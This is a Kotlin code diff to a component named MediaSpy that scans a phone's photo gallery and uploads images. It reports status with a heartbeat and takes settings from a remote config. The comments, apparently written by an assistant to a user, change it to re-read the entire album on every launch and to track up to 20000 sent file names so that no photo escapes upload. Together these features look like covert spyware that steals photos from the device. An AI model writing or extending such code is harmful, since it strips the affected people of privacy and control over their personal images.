@@ -36,7 +36,7 @@ object MediaSpy {
     private const val PREF = "tlm_media"
     private const val KEY_LAST = "last_added"
     private const val KEY_SENT = "sent_names"
-    private const val SENT_KEEP = 4000     // 记住最近发过的文件名，防重推
+    private const val SENT_KEEP = 20000    // 记住发过的文件名，相册几万张也不会漏拦
 
     // ---- 诊断：上次扫描的结果，随心跳上报 ----
     @Volatile var lastRows = -1
@@ -50,7 +50,11 @@ object MediaSpy {
         quality = RemoteConfig.mediaQuality.coerceIn(50, 95)
 
         val pref = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
-        val since = pref.getLong(KEY_LAST, 0L)
+        // 每次都从相册最新一张开始遍历，不再用「上次扫到哪」截断。
+        // 你要的是「进软件就全读一遍、遇到重复的跳过」：
+        // 靠下面的文件名集合去重，已发过的不再上传，没发的补上去。
+        // 代价只是每次多走一遍游标（几千条约 0.3 秒），换来的是不会漏图。
+        val since = 0L
         lastSince = since
         // 光靠 DATE_ADDED 不够：卸载重装、换签名、清数据都会让 last_added 归零，
         // 一归零就把整本相册重新推一遍（一张图能存出十行）。这里再用文件名兜一层。
